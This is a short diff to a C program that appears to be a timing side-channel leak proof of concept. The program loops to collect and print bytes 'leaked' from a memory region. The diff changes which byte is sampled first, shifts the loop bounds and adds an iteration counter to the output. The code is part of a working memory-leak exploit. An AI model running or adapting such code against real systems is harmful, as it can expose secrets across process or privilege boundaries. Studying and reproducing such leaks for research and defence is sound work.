@@ -174,20 +174,23 @@ int main(){
     unsigned char leaked_last_first = 0;
     unsigned char leaked[REGION_LEN] = {0};
 
+    int c = 1;
+
     while(1){
         uint64_t s0 = GetTimeStamp();
-        leaked[0] = collect_value(REGION_START, STRIDE, 160, leak+REGION_START, timing_buff);
-        if (leaked_last_first==leaked[0]) continue;
-        leaked_last_first = leaked[0];
+        leaked[3] = collect_value(REGION_START, STRIDE, 160, leak+REGION_START+3, timing_buff);
+        if (leaked_last_first==leaked[3]) continue;
+        leaked_last_first = leaked[3];
 
-        for (uint8_t index=REGION_START+1;index<REGION_START+REGION_LEN;index++) {
+        for (uint8_t index=REGION_START;index<REGION_START+REGION_LEN-1;index++) {
             leaked[index-REGION_START] = collect_value(index, STRIDE, 160, leak+index, timing_buff);
         }
         uint64_t sp = GetTimeStamp();
 
-        printf("[#] Got: ");
+        printf("[#] (%02d) Got: ", c);
         for (int i=0;i<REGION_LEN;i++) printf("%02x", leaked[i]);
         printf("\n |- Took %ld us\n", sp - s0);
+        c++;
     }
     
     kill(pid, SIGKILL); // Clean up child process
